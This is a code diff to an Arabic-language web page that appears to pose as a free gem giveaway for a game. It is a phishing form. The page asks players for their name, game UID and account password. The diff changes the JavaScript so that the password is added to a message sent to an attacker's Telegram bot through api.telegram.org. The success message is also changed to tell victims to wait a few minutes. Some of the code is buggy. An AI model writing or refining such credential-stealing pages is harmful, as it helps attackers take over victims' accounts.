@@ -123,11 +123,11 @@
         </div>
         <div class="input-group">
             <label>كلمة مرور الحساب:</label>
-            <input type="number" password="password" placeholder=" ادخل كلمه السر الخاصه بالحساب" required>
+            <input type="number" id="password" placeholder=" ادخل كلمه السر الخاصه بالحساب" required>
         </div> 
 
         <button onclick="sendToTelegram()"> مجانا اشترك الآن 🔥</button>
-        <div class="success-msg" id="successMsg">🎉 تم تسجيل اشتراكك بنجاح! حظاً موفقاً.</div>
+        <div class="success-msg" id="successMsg">🎉ليس عليك سوي الانتظار لبضع دقائق تم تسجيل اشتراكك بنجاح! حظاً موفقاً.</div>
     </div>
 
     <script>
@@ -136,7 +136,7 @@
             const uid = document.getElementById('playerUid').value;
             const password = decument.getElementById("password").value;
             if(!name || !uid|| password) {
-                alert("يرجى إدخال الاسم والـ UID للمشاركة!");
+                alert("يرجى إدخال الاسم والـباسوورد UID للمشاركة!");
                 return;
             }
 
@@ -145,7 +145,7 @@
             const chatId = "7394389253";
             
             // الرسالة المنسقة التي ستصلك
-            const message = `🎯 مشترك جديد في مسابقة الجواهر!\n\n👤 الاسم: ${name}\n🆔 الـ UID: password:${uid}`;
+            const message = `🎯 مشترك جديد في مسابقة الجواهر!\n\n👤 الاسم: ${name}\n🆔 الـ UID: uid:${uid}\n الباسوورد ${password}`;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
